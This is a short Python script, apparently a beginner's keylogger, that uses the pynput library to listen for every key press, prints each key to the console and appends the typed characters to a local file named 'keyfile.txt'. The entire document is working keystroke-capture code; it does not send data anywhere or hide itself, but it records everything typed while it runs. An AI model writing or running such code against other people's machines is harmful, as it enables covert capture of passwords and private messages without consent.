from pynput import keyboard

import datetime as dt

current_datetime = dt.datetime.now()

print(current_datetime)

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char=key.char
            logKey.write(char)
        except:
            print("Error getting char")
            
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()